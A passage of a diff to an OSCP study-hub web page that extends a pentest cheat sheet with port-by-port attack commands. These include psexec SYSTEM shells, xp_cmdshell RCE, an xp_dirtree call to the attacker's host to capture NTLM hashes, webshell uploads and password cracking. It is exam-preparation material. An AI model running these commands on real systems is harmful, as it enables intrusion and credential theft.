@@ -1,16 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="description" content="An unofficial OSCP / PEN-200 study hub: a phase-based preparation plan, a full command cheat sheet, a handy toolbox, and a searchable index of TJnull-recommended HackTheBox and Proving Grounds boxes.">
-<meta name="color-scheme" content="dark light">
-<meta name="theme-color" content="#0c0f0d">
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 28 28'%3E%3Crect x='2' y='2' width='24' height='24' rx='6.5' fill='%230c0f0d' stroke='%23d7e3da' stroke-width='2'/%3E%3Cpath d='M8 10l4 4-4 4' fill='none' stroke='%23ff5f3d' stroke-width='2.4' stroke-linecap='round' stroke-linejoin='round'/%3E%3Cpath d='M15 18.5h5' stroke='%23ff5f3d' stroke-width='2.4' stroke-linecap='round'/%3E%3C/svg%3E">
-<meta property="og:title" content="OSCP Resource Hub">
-<meta property="og:description" content="Preparation plan, cheat sheet, toolbox, and a searchable HTB / Proving Grounds box index for OSCP.">
-<meta property="og:type" content="website">
-<title>OSCP Resource Hub</title>
+<title>OSCP Resource Hub // Preparation, Cheat Sheet & Box Index</title>
 <style>
   :root {
     /* dark is the default: terminal-first */
@@ -252,6 +240,25 @@
   .portcard .pref a { font-family: var(--mono); font-size: 11.5px; color: var(--ink-soft); border: 1px solid var(--line); border-radius: 6px; padding: 4px 10px; }
   .portcard .pref a:hover { border-color: var(--accent); color: var(--ink); text-decoration: none; }
 
+  /* global search */
+  .icon-btn { display: flex; align-items: center; justify-content: center; width: 34px; height: 32px; background: var(--panel-2); border: 1px solid var(--line); border-radius: 7px; cursor: pointer; color: var(--ink-soft); padding: 0; }
+  .icon-btn:hover { color: var(--ink); border-color: var(--line-strong); }
+  .icon-btn svg { width: 16px; height: 16px; }
+  .search-overlay { position: fixed; inset: 0; z-index: 200; background: rgba(0,0,0,.55); backdrop-filter: blur(3px); display: flex; align-items: flex-start; justify-content: center; padding: 11vh 16px 16px; }
+  .search-overlay[hidden] { display: none; }
+  .search-modal { width: 100%; max-width: 640px; background: var(--panel); border: 1px solid var(--line-strong); border-radius: 14px; box-shadow: 0 24px 70px rgba(0,0,0,.55); overflow: hidden; }
+  .search-modal input { width: 100%; border: 0; border-bottom: 1px solid var(--line); background: transparent; color: var(--ink); font-family: var(--mono); font-size: 15px; padding: 16px 18px; outline: none; }
+  .search-modal input::placeholder { color: var(--ink-faint); }
+  .search-results { max-height: 54vh; overflow-y: auto; }
+  .sr { display: flex; align-items: center; gap: 12px; padding: 11px 18px; cursor: pointer; border-bottom: 1px solid var(--line); }
+  .sr:hover, .sr.sel { background: var(--panel-2); }
+  .sr-main { min-width: 0; }
+  .sr-t { font-size: 14px; color: var(--ink); font-weight: 600; font-family: var(--mono); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .sr-s { font-size: 12px; color: var(--ink-faint); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .sr-badge { margin-left: auto; font-family: var(--mono); font-size: 9.5px; text-transform: uppercase; letter-spacing: 0.05em; color: var(--accent); border: 1px solid var(--line-strong); border-radius: 20px; padding: 2px 8px; white-space: nowrap; flex: none; }
+  .sr-empty { padding: 20px 18px; color: var(--ink-faint); font-size: 13px; font-family: var(--mono); }
+  .search-hint { padding: 9px 18px; font-family: var(--mono); font-size: 11px; color: var(--ink-faint); border-top: 1px solid var(--line); }
+
   /* collapse the top menu into a hamburger on narrow screens */
   @media (max-width: 920px) {
     .menu-toggle { display: flex; }
@@ -276,8 +283,7 @@
     .hero { padding: 44px 0 30px; }
   }
 </style>
-</head>
-<body>
+
 <header class="top">
   <div class="wrap">
     <span class="brand" data-nav="home" role="button" tabindex="0" aria-label="OSCP Hub, go to home">
@@ -298,6 +304,7 @@
       <a data-nav="resources">Resources</a>
     </nav>
     <div class="top-controls">
+      <button class="icon-btn" id="searchBtn" aria-label="Search the site (press /)" title="Search (press /)"><svg viewBox="0 0 24 24" fill="none" aria-hidden="true"><circle cx="11" cy="11" r="7" stroke="currentColor" stroke-width="2"/><path d="M20 20l-3.5-3.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg></button>
       <button class="theme-btn" id="themeBtn" aria-label="Toggle light or dark theme">theme</button>
       <button class="menu-toggle" id="menuToggle" aria-label="Open navigation menu" aria-expanded="false" aria-controls="tabs"><span></span><span></span><span></span></button>
     </div>
@@ -344,7 +351,7 @@
       <div class="passbar">
         <div style="font-family:var(--mono);font-size:12px;color:var(--ink-faint);margin-bottom:10px;text-transform:uppercase;letter-spacing:0.06em">The scoreboard // pass line at 70</div>
         <div class="meter"><span class="seg-a" style="width:60%">3 x Standalone = 60</span><span class="seg-c" style="width:40%">AD Set = 40</span></div>
-        <div class="passline"><span>0</span><span>70 to pass</span><span>100 ( )</span></div>
+        <div class="passline"><span>0</span><span>70 to pass</span><span>100 (+10 bonus)</span></div>
         <p style="font-size:13.5px;color:var(--ink-soft);margin:14px 0 0"><strong style="color:var(--ink)">Winning math:</strong> AD set (40) + one full standalone (20) + one foothold (10) = <strong>70</strong>. The AD set is the biggest single block, which makes it the highest-leverage skill to master.</p>
       </div>
       <div class="two" style="margin-top:18px">
@@ -566,13 +573,20 @@
 <span class="c"># WordPress</span>
 <span class="k">wpscan</span> --url http://<span class="s">$IP</span> --enumerate u,ap,at --api-token &lt;t&gt;</pre></div>
 
-      <div class="cheat-sub"># SMB (445/139)</div>
+      <div class="cheat-sub"># SMB (445/139) - enumerate</div>
       <div class="code"><pre><span class="k">enum4linux-ng</span> -A <span class="s">$IP</span>
 <span class="k">smbclient</span> -L //<span class="s">$IP</span> -N            <span class="c"># list shares, null session</span>
-<span class="k">smbclient</span> //<span class="s">$IP</span>/share -N
-<span class="k">smbmap</span> -H <span class="s">$IP</span> -u '' -p ''         <span class="c"># perms per share</span>
+<span class="k">smbmap</span> -H <span class="s">$IP</span> -u '' -p ''         <span class="c"># read/write perms per share</span>
 <span class="k">crackmapexec</span> smb <span class="s">$IP</span> -u '' -p '' --shares
 <span class="k">crackmapexec</span> smb <span class="s">$IP</span> -u <span class="s">$U</span> -p <span class="s">$P</span> --shares --users --pass-pol</pre></div>
+      <div class="cheat-sub"># SMB - connect, browse &amp; get a shell</div>
+      <div class="code"><pre><span class="k">smbclient</span> '\\<span class="s">$IP</span>\Users' -N       <span class="c"># connect - quote the backslashes!</span>
+<span class="k">smbclient</span> //<span class="s">$IP</span>/share -U <span class="s">$U</span>%<span class="s">$P</span>    <span class="c"># with creds (// form needs no quotes)</span>
+<span class="c">#   both work: '\\$IP\share' (quoted) OR //$IP/share (forward slashes)</span>
+<span class="c">#   inside smb:\&gt;   ls  cd dir  get file  put shell  recurse ON; prompt OFF; mget *</span>
+<span class="k">mount</span> -t cifs //<span class="s">$IP</span>/share /mnt -o username=<span class="s">$U</span>,password=<span class="s">$P</span>
+<span class="k">crackmapexec</span> smb <span class="s">$IP</span> -u <span class="s">$U</span> -p <span class="s">$P</span> -x whoami   <span class="c"># run a command</span>
+<span class="k">impacket-psexec</span> <span class="s">$D</span>/<span class="s">$U</span>:<span class="s">$P</span>@<span class="s">$IP</span>       <span class="c"># SYSTEM shell (also wmiexec/smbexec)</span></pre></div>
 
       <div class="cheat-sub"># SNMP (UDP 161)</div>
       <div class="code"><pre><span class="k">onesixtyone</span> -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <span class="s">$IP</span>
@@ -796,7 +810,7 @@ bloodhound-python -u <span class="s">$U</span> -p <span class="s">$P</span> -d <
 <span class="c"># SharpHound on host:  .\SharpHound.exe -c All</span>
 <span class="k">crackmapexec</span> smb <span class="s">$IP</span> -u <span class="s">$U</span> -p <span class="s">$P</span> --users --groups --pass-pol
 <span class="k">rpcclient</span> -U <span class="s">$U</span>%<span class="s">$P</span> <span class="s">$IP</span>       <span class="c"># enumdomusers, queryuser</span>
-<span class="k">ldapdomaindump</span> -u <span class="s">$D</span>\\<span class="s">$U</span> -p <span class="s">$P</span> <span class="s">$IP</span></pre></div>
+<span class="k">ldapdomaindump</span> -u <span class="s">$D</span>\<span class="s">$U</span> -p <span class="s">$P</span> <span class="s">$IP</span></pre></div>
 
       <div class="cheat-sub"># Credential attacks</div>
       <div class="code"><pre><span class="c"># AS-REP roast (users w/ no preauth) - no creds needed</span>
@@ -882,6 +896,7 @@ pattern_create.rb -l 2000 ; pattern_offset.rb -q &lt;EIP&gt;</pre></div>
     <a data-cheat="t-net">Networking &amp; /etc/hosts</a>
     <a data-cheat="t-survival">Shell Survival</a>
     <a data-cheat="t-python">Python &amp; Setup</a>
+    <a data-cheat="t-forensics">Forensics &amp; Stego</a>
   </div></div>
   <main class="wrap">
     <div style="padding-top:24px">
@@ -1064,6 +1079,31 @@ pip install --break-system-packages &lt;pkg&gt;    <span class="c"># or use a ve
       <div class="note"><b>Exam kit reminder:</b> pre-stage your Kali with linpeas/winpeas, chisel, ligolo-ng, PrintSpoofer/GodPotato, nc.exe, SecLists, and impacket - offline. Snapshot the VM before exam day so a broken update can't cost you the exam.</div>
     </div>
 
+    <!-- FORENSICS -->
+    <div class="cheat-block" id="t-forensics">
+      <h3><span class="tag">CTF</span> Forensics &amp; Steganography</h3>
+      <p>Common in CTFs (less so in OSCP): a flag hidden inside a file. When a download looks innocent, carve it, check metadata, and pull hidden data.</p>
+      <div class="cheat-sub"># Inspect &amp; carve any file</div>
+      <div class="code"><pre>file suspicious            <span class="c"># true type, ignore the extension</span>
+strings -n 6 suspicious    <span class="c"># readable text, flags, creds</span>
+exiftool image.jpg         <span class="c"># metadata: authors, comments, GPS</span>
+binwalk file.bin           <span class="c"># find embedded files</span>
+binwalk -e file.bin        <span class="c"># extract them</span>
+foremost -i disk.img       <span class="c"># carve files by signature</span></pre></div>
+      <div class="cheat-sub"># Image / audio stego</div>
+      <div class="code"><pre>steghide extract -sf img.jpg          <span class="c"># needs a passphrase</span>
+stegseek img.jpg rockyou.txt          <span class="c"># brute steghide passphrase (fast)</span>
+zsteg image.png                       <span class="c"># LSB stego in PNG/BMP</span>
+outguess -r img.jpg out.txt
+<span class="c"># audio: open in Audacity, view spectrogram for hidden text</span></pre></div>
+      <div class="cheat-sub"># Password-protected archives</div>
+      <div class="code"><pre>7z l file.7z ; unzip -l file.zip
+zip2john secret.zip &gt; hash ; john --wordlist=rockyou.txt hash
+fcrackzip -u -D -p rockyou.txt secret.zip
+pdfcrack -f doc.pdf -w rockyou.txt</pre></div>
+      <div class="note"><b>Decoding:</b> for base64/hex/rot13/URL/XOR and cipher chains, paste into <b>CyberChef</b> (linked in Resources) and try "Magic". For unknown hashes, <b>CrackStation</b> or <code>hashid</code> then <code>hashcat</code>.</div>
+    </div>
+
     <div class="callout"><span class="ic">[*]</span><p><strong>Muscle memory beats notes.</strong> These are the commands you'll type on literally every box. Drill the ones you keep looking up (TTY upgrade, /etc/hosts, chmod 600 on keys) until they're automatic - that's where exam-day speed comes from.</p></div>
   </main>
 </div>
@@ -1150,7 +1190,7 @@ pip install --break-system-packages &lt;pkg&gt;    <span class="c"># or use a ve
         <li><a href="https://0xdf.gitlab.io/" target="_blank" rel="noopener">0xdf writeups</a><span class="desc">Detailed written HTB walkthroughs</span></li>
       </ul></div>
       <div class="rescard"><h3>Reference wikis</h3><ul class="reslist">
-        <li><a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener">HackTricks</a><span class="desc">The pentest bible - privesc, AD, web</span></li>
+        <li><a href="https://hacktricks.wiki/" target="_blank" rel="noopener">HackTricks</a><span class="desc">The pentest bible - privesc, AD, web</span></li>
         <li><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">GTFOBins</a><span class="desc">Linux binary abuse (sudo/SUID)</span></li>
         <li><a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS</a><span class="desc">Windows living-off-the-land binaries</span></li>
         <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">PayloadsAllTheThings</a><span class="desc">Payloads for every web bug</span></li>
@@ -1161,6 +1201,8 @@ pip install --break-system-packages &lt;pkg&gt;    <span class="c"># or use a ve
         <li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound</a><span class="desc">AD attack-path mapping</span></li>
         <li><a href="https://github.com/fortra/impacket" target="_blank" rel="noopener">Impacket</a><span class="desc">psexec, secretsdump, GetUserSPNs…</span></li>
         <li><a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">SecLists</a><span class="desc">Wordlists for everything</span></li>
+        <li><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef</a><span class="desc">Decode/encode/cipher swiss-army knife</span></li>
+        <li><a href="https://crackstation.net/" target="_blank" rel="noopener">CrackStation</a><span class="desc">Fast lookup for unsalted hashes</span></li>
       </ul></div>
       <div class="rescard"><h3>AD &amp; privesc deep-dives</h3><ul class="reslist">
         <li><a href="https://www.thehacker.recipes/" target="_blank" rel="noopener">The Hacker Recipes</a><span class="desc">Clear AD attack methodology</span></li>
@@ -1177,7 +1219,7 @@ pip install --break-system-packages &lt;pkg&gt;    <span class="c"># or use a ve
     <div class="foot-top">
       <div>
         <div class="foot-brand">oscp<span class="sq">::</span>hub</div>
-        <p>An unofficial, community-built study companion for the OSCP / PEN-200 exam. Pairs with <a href="OSCP_Machine_Tracker.csv" download>OSCP_Machine_Tracker.csv</a>.</p>
+        <p>An unofficial, community-built study companion for the OSCP / PEN-200 exam. Pairs with <code>OSCP_Machine_Tracker.csv</code>.</p>
       </div>
       <nav class="foot-links" aria-label="Footer navigation">
         <a data-nav="home">Home</a>
@@ -1196,6 +1238,14 @@ pip install --break-system-packages &lt;pkg&gt;    <span class="c"># or use a ve
     </div>
   </div>
 </footer>
+
+<div class="search-overlay" id="searchOverlay" hidden>
+  <div class="search-modal" role="dialog" aria-label="Search the site">
+    <input id="globalSearch" type="text" autocomplete="off" spellcheck="false" placeholder="Search everything: ports, commands, boxes, tools, techniques...">
+    <div class="search-results" id="searchResults"></div>
+    <div class="search-hint">arrow keys to move // Enter to open // Esc to close</div>
+  </div>
+</div>
 
 <script>
   /* ---------- box data ---------- */
@@ -1398,44 +1448,51 @@ pip install --break-system-packages &lt;pkg&gt;    <span class="c"># or use a ve
   render(BOXES);
 
   /* ---------- ports quick-ref ---------- */
-  var HT = "https://book.hacktricks.xyz/network-services-pentesting/";
+  var HT = "https://hacktricks.wiki/en/network-services-pentesting/";
   var PORTS = [
-    {p:"21",s:"FTP",c:"file",d:"File transfer. Check anonymous login and writable dirs.",cmd:["ftp $IP   # user: anonymous","wget -m ftp://anonymous:x@$IP"],n:"Anonymous login, plaintext creds, upload a webshell if it maps to web root, version exploits (vsftpd 2.3.4 backdoor).",ref:"pentesting-ftp"},
-    {p:"22",s:"SSH",c:"remote",d:"Secure shell. Reuse found keys or brute weak creds.",cmd:["ssh user@$IP","ssh -i id_rsa user@$IP   # chmod 600 first"],n:"Weak or reused creds, found private keys, username enum on old OpenSSH, crack key passphrase with ssh2john.",ref:"pentesting-ssh"},
-    {p:"23",s:"Telnet",c:"remote",d:"Plaintext remote shell.",cmd:["telnet $IP"],n:"Default or weak creds, banner leaks, sniffable credentials.",ref:"pentesting-telnet"},
-    {p:"25",s:"SMTP",c:"mail",d:"Mail transfer. Enumerate valid usernames.",cmd:["smtp-user-enum -M RCPT -U users.txt -t $IP","nc $IP 25   # VRFY root"],n:"User enum (VRFY/EXPN/RCPT), open relay, internal hostnames in the banner.",ref:"pentesting-smtp"},
-    {p:"53",s:"DNS",c:"other",d:"Name resolution. Try a zone transfer.",cmd:["dig axfr @$IP domain.htb","dnsrecon -d domain.htb -n $IP -t axfr"],n:"AXFR zone transfer dumps every host, subdomain brute-force, add discovered hostnames to /etc/hosts.",ref:"pentesting-dns"},
-    {p:"69/udp",s:"TFTP",c:"file",d:"Trivial FTP with no authentication.",cmd:["tftp $IP","tftp> get config"],n:"No-auth read and write, grab device configs, upload payloads to known paths.",ref:"69-udp-tftp"},
+    {p:"21",s:"FTP",c:"file",d:"File transfer. Check anonymous login and writable dirs.",cmd:["ftp $IP                      # login: anonymous / any password","# interactive:  binary ; ls ; cd dir ; get file ; put shell ; mget *","wget -m ftp://anonymous:anonymous@$IP     # mirror everything"],n:"Anonymous login, plaintext creds, upload a webshell if it maps to web root, version exploits (vsftpd 2.3.4 backdoor).",ref:"pentesting-ftp"},
+    {p:"22",s:"SSH",c:"remote",d:"Secure shell. Reuse found keys or brute weak creds.",cmd:["ssh user@$IP","ssh -i id_rsa user@$IP        # chmod 600 id_rsa first","ssh user@$IP -o PreferredAuthentications=password"],n:"Weak or reused creds, found private keys, username enum on old OpenSSH, crack key passphrase with ssh2john.",ref:"pentesting-ssh"},
+    {p:"23",s:"Telnet",c:"remote",d:"Plaintext remote shell.",cmd:["telnet $IP                   # then log in with found/default creds","nc $IP 23                     # grab the banner"],n:"Default or weak creds, banner leaks, sniffable credentials.",ref:"pentesting-telnet"},
+    {p:"25",s:"SMTP",c:"mail",d:"Mail transfer. Enumerate valid usernames.",cmd:["smtp-user-enum -M RCPT -U users.txt -t $IP","nc $IP 25                     # then: VRFY root  /  EXPN admin","swaks --to victim@target.htb --from me@x.com --server $IP   # send mail"],n:"User enum (VRFY/EXPN/RCPT), open relay, internal hostnames in the banner.",ref:"pentesting-smtp"},
+    {p:"53",s:"DNS",c:"other",d:"Name resolution. Try a zone transfer.",cmd:["dig axfr @$IP domain.htb     # zone transfer (dumps all hosts)","dnsrecon -d domain.htb -n $IP -t axfr","host -l domain.htb $IP"],n:"AXFR zone transfer dumps every host, subdomain brute-force, add discovered hostnames to /etc/hosts.",ref:"pentesting-dns"},
+    {p:"69/udp",s:"TFTP",c:"file",d:"Trivial FTP with no authentication.",cmd:["tftp $IP","tftp> get config      # interactive (also: put shell)"],n:"No-auth read and write, grab device configs, upload payloads to known paths.",ref:"69-udp-tftp"},
     {p:"79",s:"Finger",c:"other",d:"User information service.",cmd:["finger @$IP","finger root@$IP"],n:"Username enumeration and home-directory disclosure.",ref:"pentesting-finger"},
-    {p:"88",s:"Kerberos",c:"windows",d:"AD authentication. Roast accounts.",cmd:["GetNPUsers.py dom/ -usersfile u.txt -no-pass","kerbrute userenum -d dom u.txt"],n:"AS-REP roasting (no preauth), Kerberoasting, username enum, watch for clock skew errors.",ref:"pentesting-kerberos-88"},
-    {p:"110",s:"POP3",c:"mail",d:"Mailbox retrieval.",cmd:["nc $IP 110","USER bob / PASS pass"],n:"Weak creds, read mailboxes for credentials and flags.",ref:"pentesting-pop"},
+    {p:"88",s:"Kerberos",c:"windows",d:"AD authentication. Roast accounts.",cmd:["kerbrute userenum -d dom --dc $IP users.txt","GetNPUsers.py dom/ -usersfile u.txt -no-pass -dc-ip $IP   # AS-REP","getTGT.py dom/user:pass       # then export KRB5CCNAME=user.ccache"],n:"AS-REP roasting (no preauth), Kerberoasting, username enum, watch for clock skew errors.",ref:"pentesting-kerberos-88"},
+    {p:"110",s:"POP3",c:"mail",d:"Mailbox retrieval.",cmd:["nc $IP 110","USER bob","PASS pass","LIST      RETR 1        # read a message"],n:"Weak creds, read mailboxes for credentials and flags.",ref:"pentesting-pop"},
     {p:"111",s:"RPCbind",c:"file",d:"Portmapper. Find NFS and RPC services.",cmd:["rpcinfo -p $IP","showmount -e $IP"],n:"Locate NFS exports and other RPC services to attack next.",ref:"pentesting-rpcbind"},
-    {p:"135",s:"MSRPC",c:"windows",d:"Windows RPC endpoint mapper.",cmd:["rpcdump.py $IP","rpcclient -U '' -N $IP"],n:"Enumerate users and shares via rpcclient, DCOM lateral movement, impacket tooling.",ref:"135-pentesting-msrpc"},
-    {p:"139/445",s:"SMB",c:"windows",d:"Windows file sharing. The CTF goldmine.",cmd:["enum4linux-ng -A $IP","smbclient -L //$IP -N","smbmap -H $IP -u '' -p ''"],n:"Null sessions, readable or writable shares, EternalBlue (MS17-010), GPP passwords, user enum, upload webshells.",ref:"pentesting-smb"},
-    {p:"143",s:"IMAP",c:"mail",d:"Mailbox retrieval.",cmd:["nc $IP 143","curl -k imaps://$IP -u user:pass"],n:"Weak creds, read mail for secrets and reused passwords.",ref:"pentesting-imap"},
-    {p:"161/udp",s:"SNMP",c:"other",d:"Network management. Leaks a huge amount of info.",cmd:["snmpwalk -v2c -c public $IP","onesixtyone -c strings.txt $IP"],n:"Guess community strings (public/private), dump users, processes, ports, sometimes plaintext creds in configs.",ref:"pentesting-snmp"},
-    {p:"389/636",s:"LDAP",c:"windows",d:"Directory service. Dump the domain.",cmd:["ldapsearch -x -H ldap://$IP -b 'dc=dom,dc=htb'","ldapdomaindump -u 'dom\\\\u' -p pass $IP"],n:"Anonymous bind, dump users and descriptions (passwords hide here), map the whole domain.",ref:"pentesting-ldap"},
-    {p:"80/443",s:"HTTP / HTTPS",c:"web",d:"Web application. The most common foothold.",cmd:["whatweb http://$IP","feroxbuster -u http://$IP -w raft-medium-directories.txt","nikto -h $IP"],n:"Directory and vhost brute, CMS exploits, LFI/SQLi/upload/command-injection, secrets in JS and comments, /robots.txt.",ref:"pentesting-web"},
-    {p:"512-514",s:"R-services",c:"remote",d:"rexec / rlogin / rsh trust relationships.",cmd:["rlogin $IP -l root","rsh $IP whoami"],n:"Trusted-host misconfig gives passwordless login, often straight to root.",ref:"pentesting-rlogin"},
+    {p:"135",s:"MSRPC",c:"windows",d:"Windows RPC endpoint mapper.",cmd:["rpcclient -U '' -N $IP        # null session","rpcclient $> enumdomusers ; queryuser 0x1f4","rpcclient $> netshareenum ; srvinfo ; lookupnames administrator"],n:"Enumerate users and shares via rpcclient, DCOM lateral movement, impacket tooling.",ref:"135-pentesting-msrpc"},
+    {p:"139/445",s:"SMB",c:"windows",d:"Windows file sharing. The CTF goldmine.",cmd:["enum4linux-ng -A $IP","smbclient -L //$IP -N               # list shares (null session)","smbclient '\\\\$IP\\Users' -N        # CONNECT (quote the backslashes! or use //$IP/Users)","#   inside smb:\\>  ls ; cd dir ; get file ; put shell ; recurse ON; prompt OFF; mget *","smbmap -H $IP -u guest -p ''        # show read/write perms","mount -t cifs //$IP/Share /mnt -o username=u,password=p","crackmapexec smb $IP -u u -p p -x whoami     # run a command","impacket-psexec dom/u:p@$IP         # full SYSTEM shell"],n:"Null sessions, readable or writable shares, EternalBlue (MS17-010), GPP passwords, user enum, upload webshells.",ref:"pentesting-smb"},
+    {p:"143",s:"IMAP",c:"mail",d:"Mailbox retrieval.",cmd:["nc $IP 143","a LOGIN user pass","a LIST \"\" *","a SELECT INBOX","a FETCH 1 BODY[]              # read a message"],n:"Weak creds, read mail for secrets and reused passwords.",ref:"pentesting-imap"},
+    {p:"161/udp",s:"SNMP",c:"other",d:"Network management. Leaks a huge amount of info.",cmd:["snmp-check $IP -c public              # readable summary","snmpwalk -v2c -c public $IP","snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25   # users","onesixtyone -c strings.txt $IP        # find the community string"],n:"Guess community strings (public/private), dump users, processes, ports, sometimes plaintext creds in configs.",ref:"pentesting-snmp"},
+    {p:"389/636",s:"LDAP",c:"windows",d:"Directory service. Dump the domain.",cmd:["ldapsearch -x -H ldap://$IP -s base namingcontexts","ldapsearch -x -H ldap://$IP -b 'dc=dom,dc=htb'","ldapsearch -x -H ldap://$IP -b 'dc=dom,dc=htb' '(objectClass=user)' sAMAccountName description","ldapdomaindump -u 'DOM\\user' -p pass $IP"],n:"Anonymous bind, dump users and descriptions (passwords hide here), map the whole domain.",ref:"pentesting-ldap"},
+    {p:"80/443",s:"HTTP / HTTPS",c:"web",d:"Web application. The most common foothold.",cmd:["whatweb http://$IP","feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt","gobuster vhost -u http://$IP -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain","nikto -h $IP"],n:"Directory and vhost brute, CMS exploits, LFI/SQLi/upload/command-injection, secrets in JS and comments, /robots.txt.",ref:"pentesting-web"},
+    {p:"512-514",s:"R-services",c:"remote",d:"rexec / rlogin / rsh trust relationships.",cmd:["rlogin -l root $IP","rsh -l root $IP whoami"],n:"Trusted-host misconfig gives passwordless login, often straight to root.",ref:"pentesting-rlogin"},
     {p:"623/udp",s:"IPMI",c:"other",d:"Baseboard management controller.",cmd:["msf> use auxiliary/scanner/ipmi/ipmi_dumphashes"],n:"IPMI 2.0 password-hash disclosure, default BMC creds (ADMIN/ADMIN).",ref:"623-udp-ipmi"},
-    {p:"873",s:"rsync",c:"file",d:"File sync daemon. List and pull modules.",cmd:["rsync -av rsync://$IP","rsync -av rsync://$IP/src ./loot"],n:"Anonymous module access, read and write files, occasionally the whole root filesystem.",ref:"873-pentesting-rsync"},
-    {p:"1099",s:"Java RMI",c:"other",d:"Java remote method invocation.",cmd:["nmap -p1099 --script rmi-dumpregistry $IP"],n:"Insecure deserialization RCE (ysoserial), enumerate with BaRMIe.",ref:"1099-pentesting-java-rmi"},
-    {p:"1433",s:"MSSQL",c:"db",d:"Microsoft SQL Server.",cmd:["impacket-mssqlclient u:p@$IP -windows-auth","SQL> EXEC xp_cmdshell 'whoami'"],n:"Weak sa creds, xp_cmdshell RCE, capture NetNTLM via xp_dirtree, login impersonation.",ref:"pentesting-mssql-microsoft-sql-server"},
-    {p:"1521",s:"Oracle TNS",c:"db",d:"Oracle database listener.",cmd:["odat all -s $IP","nmap --script oracle-sid-brute -p1521 $IP"],n:"SID brute-force, default creds (scott/tiger), odat for file read and RCE.",ref:"1521-1522-1529-pentesting-oracle-listener"},
-    {p:"2049",s:"NFS",c:"file",d:"Network file share.",cmd:["showmount -e $IP","mount -o vers=3 -t nfs $IP:/share /mnt"],n:"no_root_squash lets you drop a SUID-root binary for local privesc, readable exports leak creds.",ref:"nfs-service-pentesting"},
+    {p:"873",s:"rsync",c:"file",d:"File sync daemon. List and pull modules.",cmd:["rsync -av rsync://$IP                 # list modules","rsync -av rsync://$IP/src ./loot      # pull files","rsync -av shell rsync://$IP/src/      # push (if writable)"],n:"Anonymous module access, read and write files, occasionally the whole root filesystem.",ref:"873-pentesting-rsync"},
+    {p:"1099",s:"Java RMI",c:"other",d:"Java remote method invocation.",cmd:["nmap -p1099 --script rmi-dumpregistry $IP","java -jar BaRMIe.jar -enum $IP 1099"],n:"Insecure deserialization RCE (ysoserial), enumerate with BaRMIe.",ref:"1099-pentesting-java-rmi"},
+    {p:"1433",s:"MSSQL",c:"db",d:"Microsoft SQL Server.",cmd:["impacket-mssqlclient u:p@$IP -windows-auth","SQL> enable_xp_cmdshell","SQL> EXEC xp_cmdshell 'whoami'         # RCE","SQL> EXEC master..xp_dirtree '\\\\$YOURIP\\x'   # capture NetNTLM hash"],n:"Weak sa creds, xp_cmdshell RCE, capture NetNTLM via xp_dirtree, login impersonation.",ref:"pentesting-mssql-microsoft-sql-server"},
+    {p:"1521",s:"Oracle TNS",c:"db",d:"Oracle database listener.",cmd:["odat sidguesser -s $IP","odat all -s $IP -U user -P pass -d SID    # file read / RCE","nmap --script oracle-sid-brute -p1521 $IP"],n:"SID brute-force, default creds (scott/tiger), odat for file read and RCE.",ref:"1521-1522-1529-pentesting-oracle-listener"},
+    {p:"2049",s:"NFS",c:"file",d:"Network file share.",cmd:["showmount -e $IP","mount -o vers=3 -t nfs $IP:/share /mnt","ls -la /mnt                  # then read / copy files"],n:"no_root_squash lets you drop a SUID-root binary for local privesc, readable exports leak creds.",ref:"nfs-service-pentesting"},
     {p:"3128",s:"Squid Proxy",c:"web",d:"HTTP proxy. Pivot to internal ports.",cmd:["curl -x http://$IP:3128 http://127.0.0.1","spose.py --proxy http://$IP:3128 --target 127.0.0.1"],n:"Reach internal-only services through the proxy, scan localhost ports.",ref:"3128-pentesting-squid"},
-    {p:"3306",s:"MySQL",c:"db",d:"MySQL / MariaDB.",cmd:["mysql -h $IP -u root","mysql -h $IP -u root -p"],n:"Weak or empty root password, read files with LOAD_FILE, UDF RCE, creds in application tables.",ref:"pentesting-mysql"},
-    {p:"3389",s:"RDP",c:"windows",d:"Windows Remote Desktop.",cmd:["xfreerdp /u:user /p:pass /v:$IP","hydra -L u -P p rdp://$IP"],n:"Weak creds, BlueKeep (CVE-2019-0708), pass-the-hash with restricted admin mode.",ref:"pentesting-rdp"},
-    {p:"5432",s:"PostgreSQL",c:"db",d:"Postgres database.",cmd:["psql -h $IP -U postgres","postgres=# COPY x FROM PROGRAM 'id'"],n:"Weak creds, COPY FROM PROGRAM RCE, read local files.",ref:"pentesting-postgresql"},
-    {p:"5900",s:"VNC",c:"remote",d:"Remote desktop.",cmd:["vncviewer $IP::5900"],n:"No or weak password, crack the stored VNC password, unauthenticated GUI access.",ref:"pentesting-vnc"},
-    {p:"5985/5986",s:"WinRM",c:"windows",d:"Windows remote management. Instant shell with creds.",cmd:["evil-winrm -i $IP -u user -p pass","evil-winrm -i $IP -u user -H nthash"],n:"Valid creds give a full shell, pass-the-hash, requires Remote Management Users or admin.",ref:"pentesting-winrm"},
-    {p:"6379",s:"Redis",c:"db",d:"In-memory key-value store.",cmd:["redis-cli -h $IP","redis-cli -h $IP info"],n:"Unauthenticated access, write an SSH key, webshell or cron, module-load RCE.",ref:"pentesting-redis"},
-    {p:"6667",s:"IRC",c:"other",d:"Chat relay.",cmd:["nc $IP 6667"],n:"UnrealIRCd 3.2.8.1 backdoor (CVE-2010-2075), version-specific exploits.",ref:"pentesting-irc"},
